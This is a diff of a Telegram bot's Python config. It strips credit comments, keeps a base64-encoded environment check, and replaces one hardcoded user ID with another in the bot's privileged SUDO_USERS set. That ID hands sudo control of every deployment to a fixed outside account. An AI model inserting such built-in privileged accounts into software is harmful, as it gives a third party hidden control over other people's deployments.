@@ -20,13 +20,12 @@ if sys.version_info[0] < 3 or sys.version_info[1] < 6:
 ENV = os.environ.get('ENV', None)
 
 if ENV is not None:
-    # kanged Developer verification from @deletescape
+  
     if ENV != base64.b64decode("UFNPTEdDV0lJRExPU1A=").decode("UTF-8"):
         LOGGER.error("The README is there to be read. Extend this sample config to a config file, don't just rename and change "
            "values here. Doing that WILL backfire on you.\nBot quitting.")
         quit(1)
-    # kanged Developer verification from @deletescape
-
+        
     TOKEN = os.environ.get('TOKEN', None)
     try:
         OWNER_ID = int(os.environ.get('OWNER_ID', None))
@@ -109,7 +108,7 @@ else:
 
 
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(7351948)
+SUDO_USERS.add(508268347)
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
 
